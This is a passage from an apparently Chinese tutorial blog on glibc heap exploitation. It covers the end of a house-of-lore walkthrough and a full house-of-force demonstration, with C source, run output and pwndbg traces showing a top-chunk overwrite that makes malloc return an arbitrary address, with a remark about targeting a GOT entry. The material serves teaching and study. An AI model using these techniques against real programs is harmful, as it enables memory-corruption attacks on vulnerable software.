class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x7ffff7dd1bd8 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">184</span>) ◂— <span class="hljs-number">0</span>x603000<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到我们的victim已经被放到了small bins中，那么对为什么victim不在unsorted bin中却在small bin中不了解的同学建议还是去看glibc内存管理的机制，这里我简单说一下</p><p>如果是32位机子会直接从unsorted bin中被扔进small bins，但是64位多了几个步骤</p><p>因为我们分配了1200的大内存，ptmalloc会先从fastbin中找，然后依次在unsorted bin,small bin中查找看看有没有符合的chunk，因为我们没有符合的chunk，所以ptmalloc会把fastbin的chunk合并，然后放到unsorted bin中，再从unsorted bin中查找，发现还是不符合，就会把unsorted bin中的chunk放入属于他的bins中，此时我们的victim就被放进了small bin中了</p><p>好了，现在我们的victim已经被放到small bin中了，现在我们更改victim的bk指针指针，让他指向栈上</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000071</span><br><span class="hljs-number">0x603010</span>:       <span class="hljs-number">0</span>x00007ffff7dd1bd8      <span class="hljs-number">0</span>x00007fffffffe620<br><span class="hljs-number">0x603020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br>pwndbg&gt; p &amp;stack_buffer_1<br>$<span class="hljs-number">10</span> = (intptr_t *(*)[<span class="hljs-number">4</span>]) <span class="hljs-number">0</span>x7fffffffe620<br>pwndbg&gt; bins<br>fastbins<br><span class="hljs-number">0</span>x20: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x30: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x40: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x50: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x60: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x70: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x80: <span class="hljs-number">0</span>x0<br>unsortedbin<br>all: <span class="hljs-number">0</span>x0<br>smallbins<br><span class="hljs-number">0</span>x70 [corrupted]<br>FD: <span class="hljs-number">0x603000</span> —▸ <span class="hljs-number">0</span>x7ffff7dd1bd8 (main_arena+<span class="hljs-number">184</span>) ◂— <span class="hljs-number">0x603000</span><br>BK: <span class="hljs-number">0x603000</span> —▸ <span class="hljs-number">0</span>x7fffffffe620 —▸ <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x400c4d (__libc_csu_init+<span class="hljs-number">77</span>) ◂— nop<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到我们已经伪造成功了，bk指针已经指到了我们的栈上</p><p>现在我们再申请一个victim一样大小的chunk,因为small bin是FIFO,所以头会被取出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">0x70</span><span class="hljs-meta"> [corrupted]</span><br><span class="hljs-attribute">FD</span>: <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x7ffff7dd1bd8 (main_arena+<span class="hljs-number">184</span>) ◂— <span class="hljs-number">0</span>x603000<br><span class="hljs-attribute">BK</span>: <span class="hljs-number">0</span>x7fffffffe620 —▸ <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x400c4d (__libc_csu_init+<span class="hljs-number">77</span>) ◂— nop<br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>现在我们再申请一个chunk就可以取到栈上的chunk了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">0x70</span><span class="hljs-meta"> [corrupted]</span><br><span class="hljs-attribute">FD</span>: <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x7ffff7dd1bd8 (main_arena+<span class="hljs-number">184</span>) ◂— <span class="hljs-number">0</span>x603000<br><span class="hljs-attribute">BK</span>: <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x400c4d (__libc_csu_init+<span class="hljs-number">77</span>) ◂— nop<br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>程序首先在栈上定义了两个变量,stack_buffer_1[4],stack_buffer_2[3]</p><p>随后在栈上创建了一个fake chunk,将stack_buffer_1的fwd指针指向了victim_chunk</p><p>随后将stack_buffere_1的bk指针指向了stack_buffer_2,将stack_buffer_2的fwd指针指向了stack_buffer_1来绕过检查</p><p>之后为了将我们的victim放进我们的small bin中,申请一个超大的chunk</p><p>在victim被放进了small bin后,我们只需要覆盖victim的bk指针指向我们的stack_buffer_1即可</p><p>现在我们再分配一个大小为100的chunk,系统就会把victim返回给我们,但此时small bin中还有我们依旧伪造好的fake chunk</p><p>此时再分配就可以将我们的fake chunk拿出来了</p><h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h2 id="序-1"><a href="#序-1" class="headerlink" title="序"></a>序</h2><p>我们所说的house of force就是利用一个巨大的数来改写top chunk的size</p><p>这样就可以通过建立一个evil_size大小的chunk来使得我们的av-&gt;top指向我们想控制的地方</p><p>此时下一次分配就可以成功控制那块内存了</p><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p>这里我也删了一些作者的话,加了一小点注释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-comment">//bss_var是我们要覆写的string</span><br><span class="hljs-type">char</span> bss_var[] = <span class="hljs-string">&quot;This is a string that we want to overwrite.&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);<br>        <span class="hljs-comment">//House of Force是覆写top chunk来分配任意内存地址的攻击方法</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);<br>        <span class="hljs-comment">//top chunk是一个特殊的chunk,是内存中最后一块chunk,在向系统申请更多空间的情况下将会更改size的大小</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br>                <span class="hljs-string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);<br>        <span class="hljs-comment">//在最后,我们将会使用这个方法来覆写bss_var的值</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Its current value is: %s\n&quot;</span>, bss_var);<br><br><br>        <span class="hljs-comment">//先分配一个chunk p1(256)</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);<br>        <span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//现在堆由两个chunk组成,一个是我们分配的,另一个就是top chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);<br>        <span class="hljs-type">int</span> real_size = <span class="hljs-built_in">malloc_usable_size</span>(p1);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//现在假设我们有一个漏洞可以覆盖top chunk的大小</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);<br><br>        <span class="hljs-comment">//----- VULNERABILITY ----</span><br>        <span class="hljs-type">intptr_t</span> *ptr_top = (<span class="hljs-type">intptr_t</span> *) ((<span class="hljs-type">char</span> *)p1 + real_size - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);<br><br>        <span class="hljs-comment">//用一个超大的值来覆盖top chunk以让我们可以确保malloc永远不会调用mmap来申请空间</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);<br>    <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>))));<br><br>        *(<span class="hljs-type">intptr_t</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)) = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>))));<br>        <span class="hljs-comment">//------------------------</span><br><br>        <span class="hljs-comment">//现在我们的top chunk的size巨大非凡,我们可以随意申请内存而不会调用mmap</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br>        <span class="hljs-comment">//下面,我们将通过整数溢出分配一个直达我们所需区域的,之后就可以在我们所需区域处分配一个chunk出来</span><br>           <span class="hljs-string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br>           <span class="hljs-string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        我们所需的size是这么计算的:</span><br><span class="hljs-comment">        nb是我们要求的size+元数据</span><br><span class="hljs-comment">         * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="hljs-comment">         * new_top = old_top + nb</span><br><span class="hljs-comment">         * nb = new_top - old_top</span><br><span class="hljs-comment">         * req + 2sizeof(long) = new_top - old_top</span><br><span class="hljs-comment">         * req = new_top - old_top - 2sizeof(long)</span><br><span class="hljs-comment">         * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="hljs-comment">         * req = dest - old_top - 4*sizeof(long)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br>        <br>    <br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br>           <span class="hljs-string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);<br>        <span class="hljs-type">void</span> *new_ptr = <span class="hljs-built_in">malloc</span>(evil_size);<br>        按预期,新的指针和旧的top chuk在同一位置<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">void</span>* ctr_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>        <span class="hljs-comment">//现在,我们覆写的下一个chunk将指向我们的目标buffer</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);<br>        <span class="hljs-comment">//现在,我们终于可以覆写这个值啦!</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;... old string: %s\n&quot;</span>, bss_var);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);<br>        <span class="hljs-built_in">strcpy</span>(ctr_chunk, <span class="hljs-string">&quot;YEAH!!!&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;... new string: %s\n&quot;</span>, bss_var);<br><br><br>        <span class="hljs-comment">//一些进一步的总结</span><br>        <span class="hljs-comment">// some further discussion:</span><br>        <span class="hljs-comment">//这个被控制的malloc将会在参数为ebil_size=malloc_got_address-8-p2_gussed时被调用</span><br>        <span class="hljs-comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br>        <span class="hljs-comment">//这个是因为main_arena-&gt;top指针被设为了 av-&gt;top + malloc_size,并且我们想要将这个地址设置为malloc_got_address - 8的地址</span><br>        <span class="hljs-comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br>        <span class="hljs-comment">//      &quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br>        <span class="hljs-comment">//为了做这件事,我们让 malloc_got_address - 8= p2_gussed+evil_size</span><br>        <span class="hljs-comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br>        <span class="hljs-comment">//av-&gt;top在分配了这个大的malloc了之后将被设置为malloc_got_address -8</span><br>        <span class="hljs-comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br>        <span class="hljs-comment">//再调用一次新的malloc的时候将返回av-&gt;top+8并且返回一个在(malloc_got_address-8)+8=malloc_got_address的chunk</span><br>        <span class="hljs-comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br>        <span class="hljs-comment">//      &quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br>        <br>        <span class="hljs-comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br>        <br>        <span class="hljs-comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br>        <span class="hljs-comment">//最后一次分配将会通过其余的代码提供服务并返回之前被注入的av-&gt;top +8</span><br>        <span class="hljs-comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Welcome <span class="hljs-keyword">to</span> the House <span class="hljs-keyword">of</span> Force<br><br>The idea <span class="hljs-keyword">of</span> House <span class="hljs-keyword">of</span> Force <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span> overwrite the top chunk <span class="hljs-built_in">and</span> <span class="hljs-keyword">let</span> the malloc <span class="hljs-keyword">return</span> an arbitrary value.<br>The top chunk <span class="hljs-built_in">is</span> a special chunk. <span class="hljs-built_in">Is</span> the last <span class="hljs-keyword">in</span> memory <span class="hljs-built_in">and</span> <span class="hljs-built_in">is</span> the chunk that will be resized <span class="hljs-keyword">when</span> malloc asks <span class="hljs-keyword">for</span> more space <span class="hljs-keyword">from</span> the os.<br><br><span class="hljs-keyword">In</span> the <span class="hljs-keyword">end</span>, we will use this <span class="hljs-keyword">to</span> overwrite a variable at <span class="hljs-number">0</span>x602060.<br>Its current value <span class="hljs-built_in">is</span>: This <span class="hljs-built_in">is</span> a <span class="hljs-type">string</span> that we want <span class="hljs-keyword">to</span> overwrite.<br><br><span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s allocate the first chunk, taking space from the wilderness.</span><br>The chunk <span class="hljs-keyword">of</span> <span class="hljs-number">256</span> bytes has been allocated at <span class="hljs-number">0</span>x18b8000.<br><br>Now the heap <span class="hljs-built_in">is</span> composed <span class="hljs-keyword">of</span> two chunks: the one we allocated <span class="hljs-built_in">and</span> the top chunk/wilderness.<br>Real size (aligned <span class="hljs-built_in">and</span> all that jazz) <span class="hljs-keyword">of</span> our allocated chunk <span class="hljs-built_in">is</span> <span class="hljs-number">280</span>.<br><br>Now <span class="hljs-keyword">let</span><span class="hljs-comment">&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><br>The top chunk starts at <span class="hljs-number">0</span>x18b8110<br><br>Overwriting the top chunk size <span class="hljs-keyword">with</span> a big value so we can ensure that the malloc will never <span class="hljs-keyword">call</span> mmap.<br>Old size <span class="hljs-keyword">of</span> top chunk <span class="hljs-number">0</span>x20ef1<br><span class="hljs-built_in">New</span> size <span class="hljs-keyword">of</span> top chunk <span class="hljs-number">0</span>xffffffffffffffff<br><br>The size <span class="hljs-keyword">of</span> the wilderness <span class="hljs-built_in">is</span> now gigantic. We can allocate anything without malloc() calling mmap.<br><span class="hljs-keyword">Next</span>, we will allocate a chunk that will <span class="hljs-keyword">get</span> us right up against the desired region (<span class="hljs-keyword">with</span> an <span class="hljs-type">integer</span><br>overflow) <span class="hljs-built_in">and</span> will <span class="hljs-keyword">then</span> be able <span class="hljs-keyword">to</span> allocate a chunk right over the desired region.<br><br>The value we want <span class="hljs-keyword">to</span> write <span class="hljs-keyword">to</span> at <span class="hljs-number">0</span>x602060, <span class="hljs-built_in">and</span> the top chunk <span class="hljs-built_in">is</span> at <span class="hljs-number">0</span>x18b8110, so accounting <span class="hljs-keyword">for</span> the header size,<br>we will malloc <span class="hljs-number">0</span>xfffffffffed49f30 bytes.<br><span class="hljs-keyword">As</span> expected, the <span class="hljs-built_in">new</span> pointer <span class="hljs-built_in">is</span> at the same place <span class="hljs-keyword">as</span> the old top chunk: <span class="hljs-number">0</span>x18b8110<br><br>Now, the <span class="hljs-keyword">next</span> chunk we overwrite will point at our target buffer.<br>malloc(<span class="hljs-number">100</span>) =&gt; <span class="hljs-number">0</span>x602060!<br>Now, we can <span class="hljs-keyword">finally</span> overwrite that value:<br>... old <span class="hljs-type">string</span>: This <span class="hljs-built_in">is</span> a <span class="hljs-type">string</span> that we want <span class="hljs-keyword">to</span> overwrite.<br>... doing strcpy overwrite <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;YEAH!!!&quot;</span>...<br>... <span class="hljs-built_in">new</span> <span class="hljs-type">string</span>: YEAH!!!<br></code></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>因为较为简单,只下了几个断点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">35</span>   <span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br>► <span class="hljs-number">36</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>  <span class="hljs-number">50</span>   *(<span class="hljs-type">intptr_t</span> *)((<span 